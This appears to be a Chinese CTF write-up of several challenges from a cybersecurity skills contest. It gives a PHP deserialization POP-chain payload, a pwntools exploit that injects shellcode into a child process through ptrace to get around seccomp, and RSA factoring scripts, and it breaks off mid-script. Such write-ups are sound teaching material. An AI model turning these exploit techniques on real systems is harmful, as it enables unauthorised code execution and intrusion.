---
title: 第二届网络安全行业职业技能大赛-部分题解
url: https://mp.weixin.qq.com/s/QMqx156NRAMSYtty_kjnrQ
source: Doonsec's feed
date: 2026-01-24
fetch_date: 2026-01-25T03:52:43.374123
---

# 第二届网络安全行业职业技能大赛-部分题解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GdwxLUFnHGKAXsskt3KflDhcyrQWC65SvshrSlCFMziaMgzFBsvG5kLp0fhdzibOxOy8jZOH89YCJA/0?wx_fmt=jpeg)

# 第二届网络安全行业职业技能大赛-部分题解

UserXCh
UserXCh

看雪学苑

![]()

在小说阅读器中沉浸阅读

由于相关题目稀缺难以收集，以下为**部分**题解。题目可能会缺失，欢迎也恳请有资源者补充相关题目。同时因为没法验证答案，可能存在错误，如有问题敬请批评指正。

**0****1**

**t2\_2 Web**

# PHP反序列化。

```
<?php
class o_dfgdf{
public $mod1;
public function __call($fuc,$param)
{
$s = $this->mod1;
$s();
        }
}
class o_ljiot{
public $mod1;
public function test()
{
$this->mod1->test();
        }
}

class o_hjldg{
public $mod1;
public function __destruct()
{
$this->mod1->test();
        }
}

class o_lijog{
public function get_flag()
{
include("flag.php");
echo $flag;
        }
}

class o_iojnd{
public $mod1;
public function __toString()
{
$this->mod1->get_flag();
return "";
        }
}

class o_podjg{
public $mod1;
public $mod2;
public function __invoke()
{
$this->mod2 = "hello, ".$this->mod1;
        }
}

$a = @unserialize($_GET['welcome']);
throw new Exception('What happened?');
echo $a;
```

构造以下代码。

```
$get_flag = new o_lijog();
$toString = new o_iojnd();
$toString->mod1 = $get_flag;
$invoke = new o_podjg();
$invoke->mod1 = $toString;
$call = new o_dfgdf();
$call->mod1 = $invoke;
$test = new o_ljiot();
$test->mod1 = $call;
$destruct = new o_hjldg();
$destruct->mod1 = $test;
$gc = array($destruct, 0);

$welcome = serialize($gc);
$welcome[-7] = '0';
echo urlencode($welcome);
```

得到payload。

```
a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22o_hjldg%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A7%3A%22o_ljiot%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A7%3A%22o_dfgdf%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A7%3A%22o_podjg%22%3A2%3A%7Bs%3A4%3A%22mod1%22%3BO%3A7%3A%22o_iojnd%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A7%3A%22o_lijog%22%3A0%3A%7B%7D%7Ds%3A4%3A%22mod2%22%3BN%3B%7D%7D%7D%7Di%3A0%3Bi%3A0%3B%7D
```

##

**0****2**

**t2\_3 Pwn**

常规Pwn题目，典型的板子题目。

### 分析思路

检查`checksec`和`seccomp`，查看伪代码。

```
Arch:amd64-64-little
RELRO:Partial RELRO
Stack:No canary found
NX:NX enabled
PIE:No PIE (0x400000)
SHSTK:Enabled
IBT:Enabled
Stripped:No
```

注意到`No PIE`，这对解题有用。

```
line  CODE  JT   JF      K
=================================
0000:0x20 0x00 0x00 0x00000004  A = arch
0001:0x15 0x00 0x09 0xc000003e  if (A !=ARCH_X86_64) goto 0011
0002:0x20 0x00 0x00 0x00000000  A = sys_number
0003:0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004:0x15 0x00 0x06 0xffffffff  if (A !=0xffffffff) goto 0011
0005:0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
0006:0x15 0x04 0x00 0x00000013  if (A == readv) goto 0011
0007:0x15 0x03 0x00 0x0000002a  if (A == connect) goto 0011
0008:0x15 0x02 0x00 0x00000039  if (A == fork) goto 0011
0009:0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011
0010:0x06 0x00 0x00 0x7fff0000  return ALLOW
0011:0x06 0x00 0x00 0x00000000  return KILL
```

虽然没有过滤`execve`，但是直接执行`execve("/bin/sh", 0, 0)`是不可行的。因为执行中同样适用`read`被禁用的规则，而执行必然调用`read`。

```
int __fastcall main(int argc, constchar **argv, constchar **envp){
__pid_t v4; // [rsp+4h] [rbp-Ch]

init(argc, argv, envp);
  v4 = fork();
if ( v4 )
  {
printf("pid: %d\n", v4);
mmap((void *)0x10000, 0x1000u, 7, 50, -1, 0);
read(0, (void *)0x10000, 0x1000u);
sandbox();
    MEMORY[0x10000]();
  }
else
  {
love();
  }
return 0;
}
```

符合以下特征。

* 父子进程，子进程`pid`已知。
* 父进程启用了`seccomp`沙箱，但`ptrace`系统调用未被过滤。
* 子进程未启用`seccomp`沙箱。
* 子进程可执行地址已知。

### 解题模板

对于符合此类特征的题目，直接使用模板即可。

与此类似的题目例如NepCTF 2025 smallbox。【参考1、参考2】区别是原题的子进程可执行地址是由`mmap`固定分配的，而此题的子进程可执行地址可借用原始代码段（回顾：`No PIE`）。

```
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

fork_shellcode = b"\x90" * 2
fork_shellcode += asm(shellcraft.sh())
while len(fork_shellcode) % 8 != 0:
    fork_shellcode += b"\x90"
fork_shellcode_u64 = [
    u64(fork_shellcode[i : i + 8]) for i in range(0, len(fork_shellcode), 8)
]

PTRACE_PEEKDATA = 2
PTRACE_POKEDATA = 5
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

main_shellcode = asm("mov r14d, [rbp-0xC]")
pid = "r14"
main_shellcode += asm(shellcraft.ptrace(PTRACE_ATTACH, pid, 0, 0))
main_shellcode += asm(shellcraft.wait4(pid, 0, 0, 0))
fork_exec_addr = 0x401170
for idx, i in enumerate(fork_shellcode_u64):
    main_shellcode += asm(
        shellcraft.ptrace(PTRACE_POKEDATA, pid, fork_exec_addr + idx * 8, i)
    )
main_regs_addr = 0x10000 + 0x500
main_shellcode += asm(shellcraft.ptrace(PTRACE_GETREGS, pid, 0, main_regs_addr))
main_shellcode += asm("mov rax, 0x{:X}".format(main_regs_addr))
main_shellcode += asm("mov rdx, 0x{:X}".format(fork_exec_addr + 2))
main_shellcode += asm("mov [rax+0x80], rdx")
main_shellcode += asm(shellcraft.ptrace(PTRACE_SETREGS, pid, 0, main_regs_addr))
main_shellcode += asm(shellcraft.ptrace(PTRACE_DETACH, pid, 0, 0))
main_shellcode += asm("jmp $")

io = process("./ezpwn")
io.send(main_shellcode)
io.interactive()
```

### 碎碎念（划重点）

整体逻辑较为简单，但有部分要点需要强调。

**Q1:**为什么使用汇编获取`pid`？

在本题中，`pid`是被直接输出的，因此可以通过`io`获取。但是考虑到通用性，有时题目不会输出`pid`，但以上结果可能被暂存在堆栈或寄存器中，因此使用汇编获取。此外，若采用将`pid`嵌入汇编源码的方式，由于`asm`每次汇编需要时间，而相同代码汇编可以利用缓存，为提高效率，防止超时，使用固定寄存器也是合理的。

**Q2:**为什么前置`b"\x90" * 2`，并跳转到`fork_exec_addr + 2`？

原题中没有体现这点，不完成这一操作也可打通。但此题有相当大概率不行。关键原因在于是否存在系统调用。

```
// 原题逻辑
while ( 1 )
        ;

// 本题逻辑
for ( i = 0; i <= 2999; ++i )
  {
puts("i love you");
    result = sleep(1u);
  }
```

原题是死循环，未涉及系统调用。而本题则包含系统调用。这到底意味着什么呢？这里涉及到Linux代码追溯至0.12版本（1992年，非常早，当时Linux还是按版本而非补丁发布）开始引入的代码行为。

```
if ((orig_eax != -1) &&
        ((eax == -ERESTARTSYS) || (eax == -ERESTARTNOINTR))) {
if ((eax == -ERESTARTSYS) && ((sa->sa_flags & SA_INTERRUPT) ||
            signr < SIGCONT || signr > SIGTTOU))
            *(&eax) = -EINTR;
else {
            *(&eax) = orig_eax;
            *(&eip) = old_eip -= 2;
        }
    }
```

例如本题，如果中断在系统调用之间，则会回退2字节，例如原题，如果不中断在系统调用之间，则无此烦恼。为了使得代码通用，我们前置`b"\x90" * 2`，并跳转到`fork_exec_addr + 2`。【参考】

**0****3**

**t3\_1 Crypto**

经典RSA题目。

### step1

```
from Crypto.Util.number import *
from secret import flag

e = 65537
m = bytes_to_long(flag.encode())
p = getPrime(256)
q1, q2 = getPrime(256), getPrime(256)
n1 = p*q1
n2 = p*q2
c1 = pow(m, e, n1)
c2 = pow(m, e, n2)
print("n1 = {}\nn2 = {}".format(n1, n2))
print("c1 = {}\nc2 = {}".format(c1, c2))

# n1 = ...
# n2 = ...
# c1 = ...
# c2 = ...
```

关注到`n1`和`n2`有最大公因数`p`，然后可得到`q1`、`q2`。

```
from Crypto.Util.number import *
from math import gcd

n1 = ...
n2 = ...
c1 = ...
c2 = ...

e = 65537
p = gcd(n1, n2)
q1 = n1 // p
q2 = n2 // p
phi1 = (p - 1) * (q1 - 1)
phi2 = (p - 1) * (q2 - 1)
assert gcd(phi1, e) == 1
assert gcd(phi2, e) == 1
d1 = pow(e, -1, phi1)
d2 = pow(e, -1, phi2)
m1 = pow(c1, d1, n1)
m2 = pow(c2, d2, n2)
assert m1 == m2

print(long_to_bytes(m1).decode())
```

得到前半部分结果`flag="flag{d963aed3-87d3"`。

### step2

```
#encoding:utf-8
from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime
import random, gmpy2

class RSAEncryptor:
def __init__(self):
        self.g = self.a = self.b = 0
        self.e = 65537
        self.factorGen()
        self.product()

def factorGen(self):
while True:
            self.g = getPrime(256)

while True:
                self.a = random.randrange(1 << 273, 1 << 274)
if gmpy2.is_prime(2*self.g*self.a + 1):
break

while True:
                self.b = random.randrange(1 << 273, 1 << 274)
if gmpy2.is_prime(2*self.g*self.b + 1) and self.b != self.a:
break

            self.h = 2*self.g*self.a*self.b + self.a + self.b
            self.N = 2*self.g*self.h + 1
return

def encrypt(self, msg_int):
return int(gmpy2.powmod(msg_int, self.e, self.N))

def product(self):
with open('/flag', 'rb') as f:
            raw = f.read().strip()
        m = bytes_to_long(raw)
        self.enc = self.encrypt(m)
        self.show()
print(f'enc={self.enc}')

def show(self):
print(f"N={self.N}")
print(f"e={self.e}")
print(f"g={self.g}")

RSAEncryptor()

# N=...
# e=65537
# g=...
# r=2
# enc=...
```

好的，题目也不知道哪里拼来改的，我也不知道给出的`r`是个啥。也就是给出`N`、`e`、`enc`、`g`要求`m`。

此题为共素数RSA。【参考】

直接使用文章中的脚本。先简单计算下相关的参数，判断符合文章“1.3.3. 已知 g”一节中“g < a + b”的情况。

```
from math import log

N = ...
e = ...
g =...